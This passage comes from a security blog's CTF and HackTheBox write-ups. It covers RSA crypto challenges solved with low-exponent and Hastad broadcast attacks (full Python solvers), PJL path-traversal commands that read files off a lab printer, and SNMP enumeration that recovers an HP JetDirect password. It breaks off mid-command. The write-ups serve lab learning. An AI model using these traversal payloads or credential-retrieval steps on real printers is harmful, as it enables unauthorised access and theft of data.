2707026205836833420926495325213943579367574987100085697983198275030082560049690384976104792045980946826660325555300100458514124012186157762882147441224700639367534144490333422997269694354445625952469391662795976652735323290855263245162753910469341528457898090564341771082201316338022681886321<br><span class="hljs-attribute">p</span>=iroot(n,4)[0]<br>phi=(p*<span class="hljs-number">*3</span>)*(p-1)<br><br><span class="hljs-attribute">d</span>=inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(pow(c,d,n)))<br></code></pre></td></tr></table></figure><p><strong>RSA04</strong></p><p>description :<br>you’ve got tricks huh, no worries , I’ll get diffrent large keys this time, but gotta use a small exponent to make the process faster</p><p>Data :<br><code>c = 1537150285716227605031838934788141177886658836535923894763771788997502746013878586588514967177576918221488975252570099470296450911774897636944014027191763 e = 3 n = 6146786767906341640151717109352619305048516049635186076371517569989570692234448672669878631257842691410568891710875462548373242004652600229150965897359313 len_flag = 22 </code></p><p>For this challenge  we can see that n is too large however the exponent being too small is our attack vector.<br>if m^e was smaller than n, we could’ve simply calculated the e’th root of of c, but that’s not the case here , so we need to loop over the c+i*N until we get the correct value of m, and knowing the bit length of the actual message we can narrow down the bruteforce range to gain time.</p><p>Solver :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, inverse, getPrime, long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><br><br>c = <span class="hljs-number">1537150285716227605031838934788141177886658836535923894763771788997502746013878586588514967177576918221488975252570099470296450911774897636944014027191763</span><br>e = <span class="hljs-number">3</span><br>n = <span class="hljs-number">6146786767906341640151717109352619305048516049635186076371517569989570692234448672669878631257842691410568891710875462548373242004652600229150965897359313</span><br>len_flag = <span class="hljs-number">22</span><br><br>val = ( (len_flag * <span class="hljs-number">8</span>) - <span class="hljs-number">4</span> ) * e<br><span class="hljs-built_in">print</span>(val)<br><span class="hljs-built_in">min</span> = <span class="hljs-number">1</span> &lt;&lt; val<br><span class="hljs-built_in">max</span> = <span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">8</span> * e * (len_flag))<br><br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> c &lt; <span class="hljs-built_in">min</span>:<br>    c += n<br>    i += <span class="hljs-number">1</span><br><br>counter = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> c &lt; <span class="hljs-built_in">max</span>:<br>    root , ismultiple = iroot(c,e)<br>    <span class="hljs-keyword">if</span> ismultiple:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Securinets&#123;&#x27;</span> + long_to_bytes(root).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;counter: <span class="hljs-subst">&#123;counter&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">pass</span><br>    c += n<br>    counter+= <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ended&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>RSA05</strong></p><p>description :I’m tired of people asking me the same question everytime and I have to generate a new key for each one of them &gt;:(<br>Data :</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ns</span> = [<span class="hljs-number">55652954556107937436558126130981628469856830287651865257678648899331805910043630032738711075829125391173995512937487967442784636753086109531427000402056608938491835296837881214860569181216532717137995094938375506869925337418160802275724334329482671051594951034447281423042165197425948725066232459381503950871</span>, <span class="hljs-number">74317707688528667734326310556369127679363839044112684268763499686297343909580606783294265127685637603095184276878475093085990102530903504855375190095606001608654646880882846997161488032875150866953493212774724313410414052408519709710246256340861000533962319218128896253429654271650449192059657854828358319881</span>, <span class="hljs-number">64610303514259489173190071645325227435529007293865254785054422075911134023740021218644975356497715317975225905438864505857734457980489143651948289084138142584568616094816024565295521676524559195168334481782417818615112202107067725334706077641337609878152825258511471444232065593907253361191149864339442436649</span>, <span class="hljs-number">89352693182075337565753811697934726171680454908902290204987204948265365745707834874285616073681156364432767956453547821098084491529476880581582210498912472764279430653450370431574884091570438640365285338339299527702254238910842664271780050921460878610523026995557275788502158207199799970687692206819907272537</span>, <span class="hljs-number">116833829788556746725985252036485299180740742457927450142375071338888809993746705437912651244451180152690376095883524309952025011184494763869022619884619675619693930967449532004051399889434706813802987262665782459913223294989308782373530514096294642790997848949753388329432981757286829750263885178311279014987</span>, <span class="hljs-number">102758156787949727052984669382103233902122311189542309969176976858686696823198636361276233347411347820142573928989678762334542047701586095569896287662346525921105945613986221927055897604739213189659461610372092731142681491560951697693644662046391780905830127253914365856623914012997152215082469668425552583487</span>, <span class="hljs-number">163250215611624901214911467708884149756974936476834832869206561773698104188108995305975191564158541422108411636873390318128385924863119602365133321392268979640180454919229980633145689220953925985916441226684300874508496239497404252056118998178342650604051465136657184676171131939430344845441258572820554373149</span>, <span class="hljs-number">92204600429229681567062981208228031396799887078013906778335334844098293896141184242189353039234741101113190249589245522193469948625904320419357053556665483940296374114264292713405417709988540557363273032511090673844981878781695146261938669841364635773144091321146338994764253780195115302035177201070158244963</span>, <span class="hljs-number">59755605009395580109959652803159492861489394796139835681371906515300680796269944279335538254122709728454563915764055575396842901324985627823234395710383578901789711244650268302038937718692877765041703711604863770531522541693756529043052460892379814210808443394069410731033984634708715176607459382001565928769</span>, <span class="hljs-number">76978698694225426603628666216050019401300196022989084900987688709659476668843883528263398684142455951317912398851720712801661496525017764889560201904598734105796900026553356894665134912312367426104709179526633379033917442960612488019845897474926149473673195033958926208537086197149478057101529430276439863137</span>, <span class="hljs-number">63481434549248676554863301953266578233243371852408309722635933401697704746634474259821047903986044965604796262512881161462978131349164911057523842039820726320582505360986190161485469496899570034800142432127592716795812853536259119980645044905132536567625723809350743593284429679811885212000798510223605323219</span>, <span class="hljs-number">111651950125212979546157305754750391030594508345202613788204455464581293091995925383166172415575749738600014405526160432230030255401013669832723848667722261517229686658797581747493454353043341953733930098743221507414831929958451522880603097097443200931516969830936195341961833185260283195923798600956230858523</span>, <span class="hljs-number">169218565764102899528206502378388223852621349400791913950861288592611975679221889096714727222519907896454228311940248576418664770427417931995199092969214477658706792650878479419876559813616235925342594124971847832945072224773800459523889221385938527325358760700287857961916467095824990282494132936371957848169</span>]<br><span class="hljs-attr">cs</span> = [<span class="hljs-number">53159491895267665854834694618908191858783711148528393162976251872433615671361845304231940271131658059190631221979488528305600369424342076235258101100595311686669434266961653390447665153058550092235809835606033534326454928348236347494359711875385696047123449293834298135686403228515308880040914367299727059527</span>, <span class="hljs-number">22386315293484117989112083698199417589956458170322806126485978531712908059186360070578536641891122497756029166716583543206386710673030810542336572067166297902831468794543741230260396297313725080565493510295927731892692769159260760058326928957021143902299275999285698583908754507177108874879067069608275699918</span>, <span class="hljs-number">133787592382651583366457626475006975997135004114138580707333697114521342075725109763954912924124694440677341894343067378940825133508196739543920256915780209104022689502219577997363598691834056508825244400725662455543507933903594587127231449927076599972948119111498535432840253133049169539714773593869525505</span>, <span class="hljs-number">31526248717883820679468067815908095944032291371017774810931771724377343491243215267937987838528343222818047976595274068982865570895661855938291073820132808790001711222673999087888838170649487110155760950004015021520725971291530970556211594830739935491050904064737083239578468580804838922587263747849764075306</span>, <span class="hljs-number">25435296823005926738364276467034436153156207170540573482890500159604430509490146787933222801037110204844214270856981850305400621479248971185378733428307289541489223529774301372171928232701241931814498064562724858478153319241857407675391607689516272580878085588831516481287054910592998591860844785177013533987</span>, <span class="hljs-number">101347505294427587514432649632426648028542934550320124395882883205397049466577560580138992450040453894012393075790639914824966010826660269456782032413103781929767161071543882336783384391581162287415792590345775081336236902286962942842331842854823272488287481561686144709156834877404840221429520122769813226264</span>, <span class="hljs-number">162943458912651618508651153467676392091156026718393085668013007798062256475864625602777660715295613841812808769941881340455503766323424202425473720556553855120993056731876391050850350178365383633230172733726855932798194223550136434445326282202288054108250257059946158819209110418042895413448281599547835589565</span>, <span class="hljs-number">52320821390089389440795023332549423002706329266023949961620426212759196189426291666845211690200140998103750457802763537528126691699807479748490635261543583937859629954716604182499131749408287124874330534725181989798523520543800078873251822815558431631342340445525827033617729940703880034836371747415950808836</span>, <span class="hljs-number">43297116305384161695601724389241545837954438166481510694515557756012573576331098332594586086564961912928034449504006930636682845461151768826538049642905604337506339073976718693715266186936525113418118303998297685675491722112583129304750826754849348285175619689814890894063878568326459174528833924398392281077</span>, <span class="hljs-number">44182602934946626460700944578656004240746142921076648208461066652204831707762435062969698600353661732843848464410402525848906484313644665876369818466191058857102118518424141870365166526334818667612702419667525308446978049710500709684940966641192019883137139823769372570859935005348534859742514544875329179761</span>, <span class="hljs-number">8837704036395335206591172732434753123982045735845134310283634591634759799872625389467004611489400017013122501683932113584474597710425887880380201396801084994585485570843898389766855006966038228406256636865245522678479204277063114536612734094049275982205205520195846757293686401707441809817745328371540329300</span>, <span class="hljs-number">93771572184712862421302603650367867291477073763952525471381946283786627510868205719242118112847024418601110508497926313890304904188843584322633943221289899548198781745352208927333812094476836185643812866753110356164917920765461739520464648117775646154014624226171221639323893022378476989928539939685917991984</span>, <span class="hljs-number">70862795735577114358155920181784752407726843840950145133637263066143344357823499361396487181863833887061506489233621969189423640556070930099048731895331671447818381223212957790459731898290733493307777734548470639238246764128971111501921003469725114994260097806392993715710870889270969348075856844771229090994</span>]<br></code></pre></td></tr></table></figure><p>Damn those lists are huge, with 13 Ns and Cs.<br>The description indicated that those ciphers come from the same message m, which hints at the <a href="https://docs.xanhacks.xyz/crypto/rsa/08-hastad-broadcast-attack/">Hastad’s Broadcast Attack</a><br>since e wasn’t given , the default solution would be that e is equal to the number of Ns and Cs in the list , which is e&#x3D;13</p><p>Solver :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BroadcastAttack</span>:<br>    <br>    t = []<br>    messsage = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, e, N, C</span>):<br>        <span class="hljs-variable language_">self</span>.e = e<br>        <span class="hljs-variable language_">self</span>.N = N<br>        <span class="hljs-variable language_">self</span>.C = C<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_partials</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.e):<br>            mod_product = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.e):<br>                <span class="hljs-keyword">if</span> i != j:<br>                    mod_product *= <span class="hljs-variable language_">self</span>.N[j]<br>            t_i = <span class="hljs-variable language_">self</span>.C[i]*mod_product*ModUtil.modinv(mod_product, <span class="hljs-variable language_">self</span>.N[i])<br>            <span class="hljs-variable language_">self</span>.t.append(t_i)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_congruence</span>(<span class="hljs-params">self</span>):<br>        partial_total = <span class="hljs-number">0</span><br>        mod_product = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.e):<br>            partial_total += <span class="hljs-variable language_">self</span>.t[i]<br>            mod_product *= <span class="hljs-variable language_">self</span>.N[i]<br><br>        <span class="hljs-variable language_">self</span>.message = ModUtil.isqrt(partial_total % mod_product, <span class="hljs-variable language_">self</span>.e)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.calculate_partials()<br>        <span class="hljs-variable language_">self</span>.solve_congruence()<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.message<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ModUtil</span>:<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a, b</span>):<br>        <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            gcd, x_old, y_old = ModUtil.egcd(b % a, a)<br>            <span class="hljs-keyword">return</span> (gcd, y_old - (b // a) * x_old, x_old)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">modinv</span>(<span class="hljs-params">a, m</span>):<br>        gcd, x, y = ModUtil.egcd(a, m)<br>        <span class="hljs-keyword">if</span> gcd != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Mod Inv Undefined&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> x % m<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isqrt</span>(<span class="hljs-params">n, k</span>):<br>        u, s = n, n+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> u &lt; s:<br>            s = u<br>            t = (k - <span class="hljs-number">1</span>) * s + n // <span class="hljs-built_in">pow</span>(s, k-<span class="hljs-number">1</span>)<br>            u = t // k<br>        <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    e = <span class="hljs-number">13</span><br>    ns = [<span class="hljs-number">55652954556107937436558126130981628469856830287651865257678648899331805910043630032738711075829125391173995512937487967442784636753086109531427000402056608938491835296837881214860569181216532717137995094938375506869925337418160802275724334329482671051594951034447281423042165197425948725066232459381503950871</span>, <span class="hljs-number">74317707688528667734326310556369127679363839044112684268763499686297343909580606783294265127685637603095184276878475093085990102530903504855375190095606001608654646880882846997161488032875150866953493212774724313410414052408519709710246256340861000533962319218128896253429654271650449192059657854828358319881</span>, <span class="hljs-number">64610303514259489173190071645325227435529007293865254785054422075911134023740021218644975356497715317975225905438864505857734457980489143651948289084138142584568616094816024565295521676524559195168334481782417818615112202107067725334706077641337609878152825258511471444232065593907253361191149864339442436649</span>, <span class="hljs-number">89352693182075337565753811697934726171680454908902290204987204948265365745707834874285616073681156364432767956453547821098084491529476880581582210498912472764279430653450370431574884091570438640365285338339299527702254238910842664271780050921460878610523026995557275788502158207199799970687692206819907272537</span>, <span class="hljs-number">116833829788556746725985252036485299180740742457927450142375071338888809993746705437912651244451180152690376095883524309952025011184494763869022619884619675619693930967449532004051399889434706813802987262665782459913223294989308782373530514096294642790997848949753388329432981757286829750263885178311279014987</span>, <span class="hljs-number">102758156787949727052984669382103233902122311189542309969176976858686696823198636361276233347411347820142573928989678762334542047701586095569896287662346525921105945613986221927055897604739213189659461610372092731142681491560951697693644662046391780905830127253914365856623914012997152215082469668425552583487</span>, <span class="hljs-number">163250215611624901214911467708884149756974936476834832869206561773698104188108995305975191564158541422108411636873390318128385924863119602365133321392268979640180454919229980633145689220953925985916441226684300874508496239497404252056118998178342650604051465136657184676171131939430344845441258572820554373149</span>, <span class="hljs-number">92204600429229681567062981208228031396799887078013906778335334844098293896141184242189353039234741101113190249589245522193469948625904320419357053556665483940296374114264292713405417709988540557363273032511090673844981878781695146261938669841364635773144091321146338994764253780195115302035177201070158244963</span>, <span class="hljs-number">59755605009395580109959652803159492861489394796139835681371906515300680796269944279335538254122709728454563915764055575396842901324985627823234395710383578901789711244650268302038937718692877765041703711604863770531522541693756529043052460892379814210808443394069410731033984634708715176607459382001565928769</span>, <span class="hljs-number">76978698694225426603628666216050019401300196022989084900987688709659476668843883528263398684142455951317912398851720712801661496525017764889560201904598734105796900026553356894665134912312367426104709179526633379033917442960612488019845897474926149473673195033958926208537086197149478057101529430276439863137</span>, <span class="hljs-number">63481434549248676554863301953266578233243371852408309722635933401697704746634474259821047903986044965604796262512881161462978131349164911057523842039820726320582505360986190161485469496899570034800142432127592716795812853536259119980645044905132536567625723809350743593284429679811885212000798510223605323219</span>, <span class="hljs-number">111651950125212979546157305754750391030594508345202613788204455464581293091995925383166172415575749738600014405526160432230030255401013669832723848667722261517229686658797581747493454353043341953733930098743221507414831929958451522880603097097443200931516969830936195341961833185260283195923798600956230858523</span>, <span class="hljs-number">169218565764102899528206502378388223852621349400791913950861288592611975679221889096714727222519907896454228311940248576418664770427417931995199092969214477658706792650878479419876559813616235925342594124971847832945072224773800459523889221385938527325358760700287857961916467095824990282494132936371957848169</span>]<br>    cs = [<span class="hljs-number">53159491895267665854834694618908191858783711148528393162976251872433615671361845304231940271131658059190631221979488528305600369424342076235258101100595311686669434266961653390447665153058550092235809835606033534326454928348236347494359711875385696047123449293834298135686403228515308880040914367299727059527</span>, <span class="hljs-number">22386315293484117989112083698199417589956458170322806126485978531712908059186360070578536641891122497756029166716583543206386710673030810542336572067166297902831468794543741230260396297313725080565493510295927731892692769159260760058326928957021143902299275999285698583908754507177108874879067069608275699918</span>, <span class="hljs-number">133787592382651583366457626475006975997135004114138580707333697114521342075725109763954912924124694440677341894343067378940825133508196739543920256915780209104022689502219577997363598691834056508825244400725662455543507933903594587127231449927076599972948119111498535432840253133049169539714773593869525505</span>, <span class="hljs-number">31526248717883820679468067815908095944032291371017774810931771724377343491243215267937987838528343222818047976595274068982865570895661855938291073820132808790001711222673999087888838170649487110155760950004015021520725971291530970556211594830739935491050904064737083239578468580804838922587263747849764075306</span>, <span class="hljs-number">25435296823005926738364276467034436153156207170540573482890500159604430509490146787933222801037110204844214270856981850305400621479248971185378733428307289541489223529774301372171928232701241931814498064562724858478153319241857407675391607689516272580878085588831516481287054910592998591860844785177013533987</span>, <span class="hljs-number">101347505294427587514432649632426648028542934550320124395882883205397049466577560580138992450040453894012393075790639914824966010826660269456782032413103781929767161071543882336783384391581162287415792590345775081336236902286962942842331842854823272488287481561686144709156834877404840221429520122769813226264</span>, <span class="hljs-number">162943458912651618508651153467676392091156026718393085668013007798062256475864625602777660715295613841812808769941881340455503766323424202425473720556553855120993056731876391050850350178365383633230172733726855932798194223550136434445326282202288054108250257059946158819209110418042895413448281599547835589565</span>, <span class="hljs-number">52320821390089389440795023332549423002706329266023949961620426212759196189426291666845211690200140998103750457802763537528126691699807479748490635261543583937859629954716604182499131749408287124874330534725181989798523520543800078873251822815558431631342340445525827033617729940703880034836371747415950808836</span>, <span class="hljs-number">43297116305384161695601724389241545837954438166481510694515557756012573576331098332594586086564961912928034449504006930636682845461151768826538049642905604337506339073976718693715266186936525113418118303998297685675491722112583129304750826754849348285175619689814890894063878568326459174528833924398392281077</span>, <span class="hljs-number">44182602934946626460700944578656004240746142921076648208461066652204831707762435062969698600353661732843848464410402525848906484313644665876369818466191058857102118518424141870365166526334818667612702419667525308446978049710500709684940966641192019883137139823769372570859935005348534859742514544875329179761</span>, <span class="hljs-number">8837704036395335206591172732434753123982045735845134310283634591634759799872625389467004611489400017013122501683932113584474597710425887880380201396801084994585485570843898389766855006966038228406256636865245522678479204277063114536612734094049275982205205520195846757293686401707441809817745328371540329300</span>, <span class="hljs-number">93771572184712862421302603650367867291477073763952525471381946283786627510868205719242118112847024418601110508497926313890304904188843584322633943221289899548198781745352208927333812094476836185643812866753110356164917920765461739520464648117775646154014624226171221639323893022378476989928539939685917991984</span>, <span class="hljs-number">70862795735577114358155920181784752407726843840950145133637263066143344357823499361396487181863833887061506489233621969189423640556070930099048731895331671447818381223212957790459731898290733493307777734548470639238246764128971111501921003469725114994260097806392993715710870889270969348075856844771229090994</span>]<br><br><br>    attack = BroadcastAttack(e, ns, cs)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(attack.attack()).decode())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB: Wander Writeup</title>
    <link href="/2024/12/28/Wander/"/>
    <url>/2024/12/28/Wander/</url>
    
    <content type="html"><![CDATA[<p>Wander is an easy level challenge and the third in the Printer exploitation track on HackTheBox</p><hr><p><strong>Challenge Description</strong><br>My uncle isn’t allowing me to print documents. He’s off to vacation, and I need a PIN to unlock this printer. All I found is a web server where this printer is managed from. Can you help me with this situation?</p><p><strong>Investigating the Web Interface</strong><br>As suggested in the challenge description, I started by exploring the web interface of the printer.<br><img src="/img/wander/img1.png" alt="image"><br>The interface includes an input field for PJL commands. PJL (Printer Job Language) is a language used to control printers, often providing advanced functionality such as file system access, configuration changes, and even debugging capabilities.</p><p>To test the input field, I tried the example command provided in the interface. It worked, confirming that the input is properly processed by the printer.<br><img src="/img/wander/img2.png" alt="image"><br><strong>Understanding PJL Command Exploitation</strong><br>After confirming that the input field accepts PJL commands, I began researching how PJL commands can be exploited. and I spent a really long time reading through diffrent websites and trying diffrent methodes before I finally landed on the perfect article for our case.</p><p><a href="https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution"><strong>Rooting a Printer: From Security Bulletin to Remote Code Execution</strong></a></p><p>Great , now let’s hack into it !</p><p><strong>Directory Enumeration</strong><br>starting off by listing directories of the printer with @PJL FSDIRLIST NAME&#x3D;”0:&#x2F;“<br><img src="/img/wander/img3.png" alt="image"><br>Using directory traversal, I moved up one level by adding ..&#x2F; to the path<br><code>@PJL FSDIRLIST NAME=&quot;0:/../”</code><br><img src="/img/wander/img4.png" alt="image"><br>We’re solwely getting there , let’s check the home directory because that’s usually where the flag is at<br><img src="/img/wander/img6.png" alt="image"><br>In &#x2F;home, I found a subdirectory named default. Navigating into this directory revealed a file named readyjob, which seemed like a potential target.</p><p><strong>Extracting the File</strong><br>To extract the contents of the readyjob file, I used the FSUPLOAD command, which allows uploading the file’s content in binary format like so :<br><code>@PJL FSUPLOAD FORMAT=BINARY NAME=&quot;0:/../../home/default/readyjob”</code><br><img src="/img/wander/img7.png" alt="image"><br>&amp; Voilaaa :D.</p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB : Antique writeup</title>
    <link href="/2024/12/28/HackTheBox-Antique-writeup/"/>
    <url>/2024/12/28/HackTheBox-Antique-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="Antique-machine-HTB"><a href="#Antique-machine-HTB" class="headerlink" title="Antique machine HTB"></a>Antique machine HTB</h2><p>Antique is an easy level machine and the second challenge in the printer exploitation track.</p><p><strong>Enumeration</strong><br>Starting with the usual nmap scan we get the following </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crystal">┌──(kali㉿kali)-[~<span class="hljs-regexp">/htb/tracks</span><span class="hljs-regexp">/Printer-Exploitation/</span>Antique]<br>└─<span class="hljs-variable">$ </span> nmap -sC -sV  <span class="hljs-number">10.129</span>.<span class="hljs-number">254.15</span><br>...<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">23</span>/tcp open  telnet?<br><br></code></pre></td></tr></table></figure><p>The Telnet service is accessible, but it requires further investigation.<br>Next, let’s perform a UDP scan to check for any open UDP services.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(kali㉿kali)-[~<span class="hljs-regexp">/htb/tracks</span><span class="hljs-regexp">/Printer-Exploitation/</span><span class="hljs-title class_">Antique</span>]<br>└─<span class="hljs-variable">$ </span>nmap  -sU   <span class="hljs-number">10.129</span>.<span class="hljs-number">254.15</span><br>...<br><span class="hljs-variable constant_">PORT</span>      <span class="hljs-variable constant_">STATE</span>         <span class="hljs-variable constant_">SERVICE</span> <span class="hljs-variable constant_">VERSION</span><br><span class="hljs-number">161</span>/udp   open          snmp    <span class="hljs-title class_">SNMPv1</span> server (<span class="hljs-keyword">public</span>)<br></code></pre></td></tr></table></figure><p>The Simple Network Management Protocol (SNMP) is running on the target machine. This protocol is often used for network monitoring and device management. let’s go ahead and enumerate that !</p><p><strong>SNMP Enumeration</strong></p><p>Let’s enumerate the SNMP service for useful information using Metasploit. Fire up msfconsole and search for SNMP enumeration modules:<br><img src="/img/ant/img1.png" alt="image"><br>From the list, I chose module 7 (auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum) to proceed but  unfortunately, no significant information was retrieved from scan. So, I will go back to investigate the open telnet port.</p><p><strong>Investigating Telnet</strong><br>Since the SNMP scan didn’t yield results, we return to the Telnet service.<br><img src="/img/ant/img3.png" alt="image"><br>Using Telnet to connect reveals that a password is required. However, we also observe the following device information, its name <code>HP JetDirect</code>.<br>This indicates the target is likely a printer device. A quick search for known vulnerabilities related to HP JetDirect reveals several CVEs. </p><p>Clicking the first link of <a href="http://cvedetails.com/">CVEDetails.com</a> and going through CVEs, this one matches our case.<br><img src="/img/ant/img4.png" alt="image"><br>I looked it up on exploit db and found a description of the attack vector.<br><img src="/img/ant/img5.png" alt="image"><br>However the tool used in this example is an exe and  it’s written in java for linux aswell.</p><p><em>This blog is not a safe place for java.</em></p><p><strong>Exploiting SNMP for Password Retrieval</strong><br>A quick search for ‘SNMP tools that send get requests’ I came across <code>snmpget</code> which is pre built in kali linux.<br><img src="/img/ant/img6.png" alt="image"><br>And we did recieve the encoded device password, we can quickly decode that in out terminal !</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(kali㉿kali)-[~/htb/tracks/Printer-Exploitation/Antique]<br>└─$ echo &quot;50<span class="hljs-number"> 40 </span>73<span class="hljs-number"> 73 </span>77<span class="hljs-number"> 30 </span>72<span class="hljs-number"> 64 </span>40<span class="hljs-number"> 31 </span>32<span class="hljs-number"> 33 </span>21<span class="hljs-number"> 21 </span>31 32<br>33<span class="hljs-number"> 1 </span>3<span class="hljs-number"> 9 </span>17<span class="hljs-number"> 18 </span>19<span class="hljs-number"> 22 </span>23<span class="hljs-number"> 25 </span>26<span class="hljs-number"> 27 </span>30<span class="hljs-number"> 31 </span>33<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>38<span class="hljs-number"> 39 </span>42<span class="hljs-number"> 43 </span>49<span class="hljs-number"> 50 </span>51<span class="hljs-number"> 54 </span>57<span class="hljs-number"> 58 </span>61<span class="hljs-number"> 65 </span>74<span class="hljs-number"> 75 </span>79<span class="hljs-number"> 82 </span>83<span class="hljs-number"> 86 </span>90<span class="hljs-number"> 91 </span>94<span class="hljs-number"> 95 </span>98<span 